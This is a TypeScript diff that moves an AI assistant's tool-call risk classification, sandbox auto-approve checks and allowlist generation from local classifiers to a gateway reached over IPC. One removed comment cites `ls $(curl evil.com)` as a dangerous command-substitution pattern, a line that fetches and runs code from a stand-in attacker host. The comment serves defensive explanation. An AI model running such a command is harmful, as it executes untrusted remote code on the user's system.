@@ -6,8 +6,9 @@ import { isAssistantFeatureFlagEnabled } from "../config/assistant-feature-flags
 import { getIsContainerized } from "../config/env-registry.js";
 import { getConfig } from "../config/loader.js";
 import { loadSkillCatalog, resolveSkillSelector } from "../config/skills.js";
+import { ipcClassifyRisk } from "../ipc/gateway-client.js";
 import { indexCatalogById } from "../skills/include-graph.js";
-import { normalizeFilePath } from "../skills/path-classifier.js";
+import { getSkillRoots, normalizeFilePath } from "../skills/path-classifier.js";
 import { computeTransitiveSkillVersionHash } from "../skills/transitive-version-hash.js";
 import { computeSkillVersionHash } from "../skills/version-hash.js";
 import type { ManifestOverride } from "../tools/execution-target.js";
@@ -16,31 +17,20 @@ import {
   looksLikePathOnlyInput,
 } from "../tools/network/url-safety.js";
 import { getTool } from "../tools/registry.js";
-import { getWorkspaceDir } from "../util/platform.js";
+import {
+  getDeprecatedDir,
+  getProtectedDir,
+  getWorkspaceDir,
+  getWorkspaceHooksDir,
+} from "../util/platform.js";
 import {
   type ApprovalContext,
   DefaultApprovalPolicy,
   resolveThreshold,
 } from "./approval-policy.js";
-import { parseArgs } from "./arg-parser.js";
-import { bashRiskClassifier } from "./bash-risk-classifier.js";
-import { DEFAULT_COMMAND_REGISTRY } from "./command-registry.js";
-import { fileRiskClassifier } from "./file-risk-classifier.js";
 import { getAutoApproveThreshold } from "./gateway-threshold-reader.js";
-import {
-  type CommandRiskSpec,
-  type RiskAssessment,
-  riskToRiskLevel,
-} from "./risk-types.js";
-import { scheduleRiskClassifier } from "./schedule-risk-classifier.js";
-import {
-  analyzeShellCommand,
-  buildShellAllowlistOptions,
-  cachedParse,
-  deriveShellActionKeys,
-  type ParsedCommand,
-} from "./shell-identity.js";
-import { skillLoadRiskClassifier } from "./skill-risk-classifier.js";
+import type { ClassificationResult } from "./ipc-risk-types.js";
+import type { RiskAssessment } from "./risk-types.js";
 import { findHighestPriorityRule, onRulesChanged } from "./trust-store.js";
 import {
   type AllowlistOption,
@@ -49,15 +39,11 @@ import {
   RiskLevel,
   type ScopeOption,
 } from "./types.js";
-import { webRiskClassifier } from "./web-risk-classifier.js";
-import {
-  isPathWithinWorkspaceRoot,
-  isWorkspaceScopedInvocation,
-} from "./workspace-policy.js";
+import { isWorkspaceScopedInvocation } from "./workspace-policy.js";
 
 // ── Risk classification cache ────────────────────────────────────────────────
-// classifyRisk() is called on every permission check and can invoke WASM
-// parsing for shell commands. Cache results keyed on
+// classifyRisk() is called on every permission check and delegates to the
+// gateway via IPC. Cache results keyed on
 // (toolName, inputHash, workingDir, manifestOverride).
 // Invalidated when trust rules change since risk classification for file tools
 // depends on skill source path checks which reference config, but the core
@@ -69,13 +55,28 @@ export interface RiskClassification {
   reason?: string;
 }
 
+/**
+ * Extended risk classification that includes gateway-provided metadata
+ * used by check() for command candidate building and sandbox auto-approve.
+ */
+interface RiskClassificationWithMeta extends RiskClassification {
+  /** Command candidates from the gateway for v1 trust rule matching (bash tools). */
+  commandCandidates?: string[];
+  /** Action keys from the gateway for v1 trust rule matching (bash tools). */
+  actionKeys?: string[];
+  /** Whether the command qualifies for sandbox auto-approve (bash tools). */
+  sandboxAutoApprove?: boolean;
+  /** Allowlist options from the gateway for generateAllowlistOptions(). */
+  allowlistOptions?: AllowlistOption[];
+}
+
 const RISK_CACHE_MAX = 256;
-const riskCache = new Map<string, RiskClassification>();
+const riskCache = new Map<string, RiskClassificationWithMeta>();
 let riskCacheInvalidationHookRegistered = false;
 
 // ── Assessment cache ─────────────────────────────────────────────────────────
-// Stores the full RiskAssessment from classifier-backed tools so that
-// generateAllowlistOptions() can read classifier-produced allowlistOptions
+// Stores the full ClassificationResult from the gateway so that
+// generateAllowlistOptions() can read gateway-produced allowlistOptions
 // without re-classifying. Keyed on (toolName, inputHash) — a simpler key
 // than the full risk cache since generateAllowlistOptions() does not receive
 // workingDir or manifestOverride. Cleared alongside the risk cache.
@@ -248,34 +249,181 @@ function escapeMinimatchLiteral(value: string): string {
   return value.replace(/([\\*?[\]{}()!+@|])/g, "\\$1");
 }
 
+// ── IPC param builders ───────────────────────────────────────────────────────
+// Build the ClassifyRiskParams for each tool family. These resolve
+// assistant-local context (file paths, skill metadata, etc.) before
+// forwarding to the gateway.
+
+import type {
+  ClassifyRiskParams,
+  FileContext,
+  SkillMetadata,
+} from "./ipc-risk-types.js";
+
+function buildFileContext(): FileContext {
+  const config = getConfig();
+  return {
+    protectedDir: getProtectedDir(),
+    deprecatedDir: getDeprecatedDir(),
+    hooksDir: getWorkspaceHooksDir(),
+    actorTokenSigningKeyPath: join(
+      getProtectedDir(),
+      "actor-token-signing-key",
+    ),
+    skillSourceDirs: getSkillRoots(config.skills.load.extraDirs),
+  };
+}
+
+function resolveSkillMetadata(selector: string): SkillMetadata | undefined {
+  const resolved = resolveSkillIdAndHash(selector);
+  if (!resolved) return undefined;
+
+  const config = getConfig();
+  const inlineEnabled = isAssistantFeatureFlagEnabled(
+    "inline-skill-commands",
+    config,
+  );
+  const inlineExpansions = hasInlineExpansions(resolved.id);
+  const isDynamic = inlineEnabled && inlineExpansions;
+
+  return {
+    skillId: resolved.id,
+    selector,
+    versionHash: resolved.versionHash ?? "",
+    transitiveHash: isDynamic
+      ? computeTransitiveHashSafe(resolved.id)
+      : undefined,
+    hasInlineExpansions: inlineExpansions,
+    isDynamic,
+  };
+}
+
+function buildClassifyRiskParams(
+  toolName: string,
+  input: Record<string, unknown>,
+  workingDir?: string,
+  manifestOverride?: ManifestOverride,
+): ClassifyRiskParams {
+  // ── Bash/host_bash ──
+  if (toolName === "bash" || toolName === "host_bash") {
+    return {
+      tool: toolName,
+      command: getStringField(input, "command"),
+      workingDir,
+      workspaceRoot: getWorkspaceDir(),
+      isContainerized: getIsContainerized(),
+      networkMode:
+        typeof input.network_mode === "string" ? input.network_mode : undefined,
+    };
+  }
+
+  // ── File tools ──
+  if (
+    [
+      "file_read",
+      "file_write",
+      "file_edit",
+      "host_file_read",
+      "host_file_write",
+      "host_file_edit",
+    ].includes(toolName)
+  ) {
+    const isHostTool = toolName.startsWith("host_");
+    return {
+      tool: toolName,
+      path: getStringField(input, "path", "file_path"),
+      workingDir: isHostTool ? "/" : (workingDir ?? process.cwd()),
+      fileContext: buildFileContext(),
+    };
+  }
+
+  // ── Web tools ──
+  if (["web_fetch", "network_request", "web_search"].includes(toolName)) {
+    return {
+      tool: toolName,
+      url: getStringField(input, "url"),
+      allowPrivateNetwork: input.allow_private_network === true,
+    };
+  }
+
+  // ── Skill tools ──
+  if (
+    ["skill_load", "scaffold_managed_skill", "delete_managed_skill"].includes(
+      toolName,
+    )
+  ) {
+    const selector = getStringField(input, "skill", "skill_id").trim();
+    return {
+      tool: toolName,
+      skill: selector,
+      skillMetadata: selector ? resolveSkillMetadata(selector) : undefined,
+    };
+  }
+
+  // ── Schedule tools ──
+  if (toolName === "schedule_create" || toolName === "schedule_update") {
+    return {
+      tool: toolName,
+      mode: getStringField(input, "mode") || undefined,
+      script: getStringField(input, "script") || undefined,
+    };
+  }
+
+  // ── Unknown tools ──
+  // Forward the tool's registry default risk level so the gateway can use it
+  // instead of hardcoding medium for unknown tools. When the tool is not in the
+  // registry but a manifestOverride provides a risk, use that instead.
+  const tool = getTool(toolName);
+  let registryDefaultRisk: string | undefined;
+  if (tool) {
+    registryDefaultRisk =
+      tool.defaultRiskLevel === RiskLevel.Low
+        ? "low"
+        : tool.defaultRiskLevel === RiskLevel.High
+          ? "high"
+          : tool.defaultRiskLevel === RiskLevel.Medium
+            ? "medium"
+            : undefined;
+  } else if (manifestOverride?.risk) {
+    registryDefaultRisk = manifestOverride.risk;
+  }
+  return { tool: toolName, registryDefaultRisk };
+}
+
+// ── Risk string → RiskLevel mapping ──────────────────────────────────────────
+
+function riskStringToLevel(risk: string): RiskLevel {
+  switch (risk) {
+    case "low":
+      return RiskLevel.Low;
+    case "medium":
+      return RiskLevel.Medium;
+    case "high":
+      return RiskLevel.High;
+    default:
+      return RiskLevel.Medium;
+  }
+}
+
+// ── Command candidate builders (non-bash tools) ──────────────────────────────
+// Bash command candidates come from the gateway response. Other tool types
+// derive candidates from assistant-local data (file paths, URLs, skill
+// selectors) since the assistant owns the resolution logic.
+
 async function buildCommandCandidates(
   toolName: string,
   input: Record<string, unknown>,
   workingDir: string,
-  preParsed?: ParsedCommand,
+  gatewayResult?: ClassificationResult,
 ): Promise<string[]> {
+  // For bash/host_bash, use gateway-provided candidates and action keys.
   if (toolName === "bash" || toolName === "host_bash") {
-    const command = getStringField(input, "command").trim();
-    if (!command) return [command];
-
-    const analysis = await analyzeShellCommand(command, preParsed);
-    const actionResult = deriveShellActionKeys(analysis);
-
-    const candidates: string[] = [command];
-
-    if (actionResult.keys.length > 0) {
-      if (actionResult.isSimpleAction && actionResult.primarySegment) {
-        const canonical = actionResult.primarySegment.command;
-        if (canonical !== command) {
-          candidates.push(canonical);
-        }
-      }
-      for (const actionKey of actionResult.keys) {
-        candidates.push(actionKey.key);
-      }
+    if (gatewayResult?.commandCandidates) {
+      return gatewayResult.commandCandidates;
     }
-
-    return [...new Set(candidates)];
+    // Fallback: just return the raw command string
+    const command = getStringField(input, "command").trim();
+    return command ? [command] : [command];
   }
 
   if (toolName === "skill_load") {
@@ -409,198 +557,75 @@ export async function classifyRisk(
   toolName: string,
   input: Record<string, unknown>,
   workingDir?: string,
-  preParsed?: ParsedCommand,
+  _preParsed?: unknown,
   manifestOverride?: ManifestOverride,
   signal?: AbortSignal,
-): Promise<RiskClassification> {
+): Promise<RiskClassificationWithMeta> {
   signal?.throwIfAborted();
   ensureRiskCacheInvalidationHook();
 
-  // Check cache first (skip when preParsed is provided since caller already
-  // parsed and we'd just be duplicating the key computation cost).
-  const cacheKey = preParsed
-    ? null
-    : riskCacheKey(toolName, input, workingDir, manifestOverride);
-  if (cacheKey) {
-    const cached = riskCache.get(cacheKey);
-    if (cached !== undefined) {
-      // LRU refresh
-      riskCache.delete(cacheKey);
-      riskCache.set(cacheKey, cached);
-      return cached;
-    }
+  // Check cache first.
+  const cacheKey = riskCacheKey(toolName, input, workingDir, manifestOverride);
+  const cached = riskCache.get(cacheKey);
+  if (cached !== undefined) {
+    // LRU refresh
+    riskCache.delete(cacheKey);
+    riskCache.set(cacheKey, cached);
+    return cached;
   }
 
-  // ── Bash/host_bash: delegate to the registry-driven BashRiskClassifier ────
-  let result: RiskClassification;
-  let classifierAssessment: RiskAssessment | undefined;
-  if (toolName === "bash" || toolName === "host_bash") {
-    const command = ((input.command as string) ?? "").trim();
-    if (!command) {
-      result = { level: RiskLevel.Low };
-    } else {
-      const assessment = await bashRiskClassifier.classify({
-        command,
-        toolName: toolName as "bash" | "host_bash",
-      });
-      classifierAssessment = assessment;
-      result = {
-        level: riskToRiskLevel(assessment.riskLevel),
-        reason: assessment.reason,
-      };
-    }
-  }
-  // ── File tools: delegate to FileRiskClassifier ──────────────────────────
-  else if (
-    [
-      "file_read",
-      "file_write",
-      "file_edit",
-      "host_file_read",
-      "host_file_write",
-      "host_file_edit",
-      "host_file_transfer",
-    ].includes(toolName)
-  ) {
-    const filePath = getStringField(
-      input,
-      "path",
-      "file_path",
-      "dest_path",
-      "source_path",
+  // ── Delegate to gateway via IPC ────────────────────────────────────────────
+  const ipcParams = buildClassifyRiskParams(
+    toolName,
+    input,
+    workingDir,
+    manifestOverride,
+  );
+  const gatewayResult = await ipcClassifyRisk(ipcParams);
+
+  if (!gatewayResult) {
+    throw new Error(
+      `Gateway IPC classify_risk failed for tool "${toolName}" — gateway is unreachable or returned an invalid response`,
     );
-    const isHostTool = toolName.startsWith("host_");
-    const assessment = await fileRiskClassifier.classify({
-      toolName: toolName as
-        | "file_read"
-        | "file_write"
-        | "file_edit"
-        | "host_file_read"
-        | "host_file_write"
-        | "host_file_edit"
-        | "host_file_transfer",
-      filePath,
-      workingDir: isHostTool ? "/" : (workingDir ?? process.cwd()),
-    });
-    classifierAssessment = assessment;
-    result = {
-      level: riskToRiskLevel(assessment.riskLevel),
-      reason: assessment.reason,
-    };
-  }
-  // ── Web tools: delegate to WebRiskClassifier ────────────────────────────
-  else if (["web_fetch", "network_request", "web_search"].includes(toolName)) {
-    const assessment = await webRiskClassifier.classify({
-      toolName: toolName as "web_fetch" | "network_request" | "web_search",
-      url: getStringField(input, "url"),
-      allowPrivateNetwork: input.allow_private_network === true,
-    });
-    classifierAssessment = assessment;
-    result = {
-      level: riskToRiskLevel(assessment.riskLevel),
-      reason: assessment.reason,
-    };
-  }
-  // ── Skill tools: delegate to SkillLoadRiskClassifier ────────────────────
-  else if (
-    ["skill_load", "scaffold_managed_skill", "delete_managed_skill"].includes(
-      toolName,
-    )
-  ) {
-    const assessment = await skillLoadRiskClassifier.classify({
-      toolName: toolName as
-        | "skill_load"
-        | "scaffold_managed_skill"
-        | "delete_managed_skill",
-      skillSelector: getStringField(input, "skill", "skill_id").trim(),
-    });
-    classifierAssessment = assessment;
-    result = {
-      level: riskToRiskLevel(assessment.riskLevel),
-      reason: assessment.reason,
-    };
-  }
-  // ── Schedule tools: delegate to ScheduleRiskClassifier ──────────────────
-  else if (toolName === "schedule_create" || toolName === "schedule_update") {
-    const assessment = await scheduleRiskClassifier.classify({
-      toolName,
-      mode: getStringField(input, "mode") || undefined,
-      script: getStringField(input, "script") || undefined,
-    });
-    classifierAssessment = assessment;
-    result = {
-      level: riskToRiskLevel(assessment.riskLevel),
-      reason: assessment.reason,
-    };
-  }
-  // ── Remaining tools: fall through to registry-based classification ──────
-  else {
-    result = {
-      level: await classifyRiskFromRegistry(
-        toolName,
-        input,
-        workingDir,
-        manifestOverride,
-      ),
-    };
   }
 
-  // Proxied bash commands route through the credential proxy which handles
-  // per-request approval separately. Cap the bash tool's own risk at Medium
-  // so trust rules can auto-allow the command execution.
-  if (
-    toolName === "bash" &&
-    input.network_mode === "proxied" &&
-    result.level === RiskLevel.High
-  ) {
-    result = { level: RiskLevel.Medium, reason: result.reason };
-  }
+  const result: RiskClassificationWithMeta = {
+    level: riskStringToLevel(gatewayResult.risk),
+    reason: gatewayResult.reason,
+    commandCandidates: gatewayResult.commandCandidates,
+    actionKeys: gatewayResult.actionKeys,
+    sandboxAutoApprove: gatewayResult.sandboxAutoApprove,
+    allowlistOptions: gatewayResult.allowlistOptions,
+  };
 
-  if (cacheKey) {
-    if (riskCache.size >= RISK_CACHE_MAX) {
-      const oldest = riskCache.keys().next().value;
-      if (oldest !== undefined) riskCache.delete(oldest);
-    }
-    riskCache.set(cacheKey, result);
+  // Cache the result.
+  if (riskCache.size >= RISK_CACHE_MAX) {
+    const oldest = riskCache.keys().next().value;
+    if (oldest !== undefined) riskCache.delete(oldest);
   }
+  riskCache.set(cacheKey, result);
 
-  // Store the full assessment in a separate cache keyed on (toolName, input)
-  // so generateAllowlistOptions() can retrieve classifier-produced options.
-  if (classifierAssessment) {
-    const aKey = assessmentCacheKey(toolName, input);
-    if (assessmentCache.size >= RISK_CACHE_MAX) {
-      const oldest = assessmentCache.keys().next().value;
-      if (oldest !== undefined) assessmentCache.delete(oldest);
-    }
-    assessmentCache.set(aKey, classifierAssessment);
+  // Store a RiskAssessment-shaped entry in the assessment cache so
+  // generateAllowlistOptions() can retrieve gateway-produced options.
+  // Note: RiskAssessment.scopeOptions uses the risk-types ScopeOption
+  // (pattern/label) which differs from the gateway's ScopeOption
+  // (scope/label). Since the assessment cache is only consulted for
+  // allowlistOptions, we pass an empty scopeOptions array.
+  const assessment: RiskAssessment = {
+    riskLevel: gatewayResult.risk === "unknown" ? "medium" : gatewayResult.risk,
+    reason: gatewayResult.reason,
+    scopeOptions: [],
+    matchType: gatewayResult.matchType ?? "unknown",
+    allowlistOptions: gatewayResult.allowlistOptions,
+  };
+  const aKey = assessmentCacheKey(toolName, input);
+  if (assessmentCache.size >= RISK_CACHE_MAX) {
+    const oldest = assessmentCache.keys().next().value;
+    if (oldest !== undefined) assessmentCache.delete(oldest);
   }
+  assessmentCache.set(aKey, assessment);
 
   return result;
-}
-
-async function classifyRiskFromRegistry(
-  toolName: string,
-  _input: Record<string, unknown>,
-  _workingDir?: string,
-  manifestOverride?: ManifestOverride,
-): Promise<RiskLevel> {
-  // Check the tool registry for a declared default risk level
-  const tool = getTool(toolName);
-  if (tool) return tool.defaultRiskLevel;
-
-  // Use manifest metadata for unregistered skill tools so the Permission
-  // Simulator shows accurate risk levels instead of defaulting to Medium.
-  if (manifestOverride) {
-    const riskMap: Record<string, RiskLevel> = {
-      low: RiskLevel.Low,
-      medium: RiskLevel.Medium,
-      high: RiskLevel.High,
-    };
-    return riskMap[manifestOverride.risk] ?? RiskLevel.Medium;
-  }
-
-  // Unknown tool → Medium
-  return RiskLevel.Medium;
 }
 
 export async function check(
@@ -613,30 +638,30 @@ export async function check(
 ): Promise<PermissionCheckResult> {
   signal?.throwIfAborted();
 
-  // For shell tools, parse once and share the result to avoid duplicate tree-sitter work.
-  let shellParsed: ParsedCommand | undefined;
-  if (toolName === "bash" || toolName === "host_bash") {
-    const command = ((input.command as string) ?? "").trim();
-    if (command) {
-      shellParsed = await cachedParse(command);
-    }
-  }
-
-  const { level: risk, reason: riskReason } = await classifyRisk(
+  const classification = await classifyRisk(
     toolName,
     input,
     workingDir,
-    shellParsed,
+    undefined,
     manifestOverride,
     signal,
   );
 
-  // Build command string candidates for rule matching
+  const { level: risk, reason: riskReason } = classification;
+
+  // Build command string candidates for rule matching.
+  // For bash tools, use gateway-provided candidates; for other tools,
+  // derive candidates from assistant-local data.
   const commandCandidates = await buildCommandCandidates(
     toolName,
     input,
     workingDir,
-    shellParsed,
+    // Pass the gateway result so bash tools can use commandCandidates
+    classification.commandCandidates
+      ? ({
+          commandCandidates: classification.commandCandidates,
+        } as ClassificationResult)
+      : undefined,
   );
 
   // Find the highest-priority matching rule across all candidates
@@ -647,66 +672,8 @@ export async function check(
     policyContext,
   );
 
-  // Resolve sandboxAutoApprove for bash commands — all pipeline segments must be
-  // on the allowlist, and the command must not contain opaque constructs or
-  // dangerous patterns (e.g. `ls $(curl evil.com)` has an allowlisted program
-  // but a command substitution that could execute arbitrary code).
-  //
-  // For non-containerized environments, path resolution is applied: each
-  // segment's arguments are parsed via the command's argSchema, and all
-  // path arguments must resolve within the workspace root. Containerized
-  // environments skip path checks since the entire filesystem is the workspace.
-  let hasSandboxAutoApprove = false;
-  if (toolName === "bash" && shellParsed) {
-    const workspaceRoot = getWorkspaceDir();
-    const isContainerized = getIsContainerized();
-
-    hasSandboxAutoApprove =
-      shellParsed.segments.length > 0 &&
-      !shellParsed.hasOpaqueConstructs &&
-      shellParsed.dangerousPatterns.length === 0 &&
-      shellParsed.segments.every((seg) => {
-        const name = seg.program.split("/").pop() ?? seg.program;
-        const spec: CommandRiskSpec | undefined = Object.hasOwn(
-          DEFAULT_COMMAND_REGISTRY,
-          name,
-        )
-          ? DEFAULT_COMMAND_REGISTRY[
-              name as keyof typeof DEFAULT_COMMAND_REGISTRY
-            ]
-          : undefined;
-        if (!spec?.sandboxAutoApprove) return false;
-
-        // Containerized: entire fs is workspace, skip path checks
-        if (isContainerized) return true;
-
-        // Non-containerized: parse args and check all path args against workspace
-        const schema = spec.argSchema ?? {};
-        const parsed = parseArgs(seg.args, schema);
-
-        // If no path args, auto-approve (operating on cwd/stdin which is workspace)
-        if (parsed.pathArgs.length === 0) return true;
-
-        // All path args must resolve within workspace
-        return parsed.pathArgs.every((p) => {
-          // Handle ~ expansion: ~/ is current user's home, ~user/ is another
-          // user's home. Both resolve outside the workspace in practice.
-          // Treat any tilde-prefixed path as outside workspace unless it
-          // happens to resolve within it after expansion.
-          if (p === "~" || p.startsWith("~/")) {
-            const expanded =
-              p === "~" ? homedir() : join(homedir(), p.slice(2));
-            return isPathWithinWorkspaceRoot(expanded, workspaceRoot);
-          }
-          if (p.startsWith("~")) {
-            // ~root/, ~user/, etc. — resolve outside workspace
-            return false;
-          }
-          const resolved = p.startsWith("/") ? p : resolve(workingDir, p);
-          return isPathWithinWorkspaceRoot(resolved, workspaceRoot);
-        });
-      });
-  }
+  // Use gateway-provided sandboxAutoApprove instead of evaluating locally.
+  const hasSandboxAutoApprove = classification.sandboxAutoApprove ?? false;
 
   // Build approval context from local variables
   const tool = getTool(toolName);
@@ -801,14 +768,6 @@ type AllowlistStrategy = (
   toolName: string,
   input: Record<string, unknown>,
 ) => Promise<AllowlistOption[]> | AllowlistOption[];
-
-function shellAllowlistStrategy(
-  _toolName: string,
-  input: Record<string, unknown>,
-): Promise<AllowlistOption[]> {
-  const command = ((input.command as string) ?? "").trim();
-  return buildShellAllowlistOptions(command);
-}
 
 function fileAllowlistStrategy(
   toolName: string,
@@ -984,8 +943,6 @@ function skillLoadAllowlistStrategy(
 }
 
 const ALLOWLIST_STRATEGIES: Record<string, AllowlistStrategy> = {
-  bash: shellAllowlistStrategy,
-  host_bash: shellAllowlistStrategy,
   file_read: fileAllowlistStrategy,
   file_write: fileAllowlistStrategy,
   file_edit: fileAllowlistStrategy,
@@ -1007,26 +964,20 @@ export async function generateAllowlistOptions(
 ): Promise<AllowlistOption[]> {
   signal?.throwIfAborted();
 
-  // When permission-controls-v3 is enabled, use classifier-produced options
-  // from the assessment cache (populated by BashRiskClassifier.classify()).
-  // When the flag is off, fall through to the legacy per-tool strategies
-  // (e.g. shellAllowlistStrategy for bash/host_bash) to avoid changing the
-  // allowlist pattern format for users who haven't opted in.
-  const config = getConfig();
-  if (isAssistantFeatureFlagEnabled("permission-controls-v3", config)) {
-    const aKey = assessmentCacheKey(toolName, input);
-    const cachedAssessment = assessmentCache.get(aKey);
-    if (
-      cachedAssessment?.allowlistOptions &&
-      cachedAssessment.allowlistOptions.length > 0
-    ) {
-      return cachedAssessment.allowlistOptions;
-    }
+  // Use gateway-produced allowlist options from the assessment cache.
+  // For bash/host_bash tools, these are always provided by the gateway.
+  // For other tools that have classifier-produced options, use those too.
+  const aKey = assessmentCacheKey(toolName, input);
+  const cachedAssessment = assessmentCache.get(aKey);
+  if (
+    cachedAssessment?.allowlistOptions &&
+    cachedAssessment.allowlistOptions.length > 0
+  ) {
+    return cachedAssessment.allowlistOptions;
   }
 
-  // Fall back to the per-tool strategy function. For bash/host_bash when the
-  // flag is off, this uses shellAllowlistStrategy (action: key patterns).
-  // For other tools, this is the only path.
+  // Fall back to the per-tool strategy function for non-bash tools
+  // or when no cached assessment exists.
   if (Object.hasOwn(ALLOWLIST_STRATEGIES, toolName)) {
     return ALLOWLIST_STRATEGIES[toolName](toolName, input);
   }
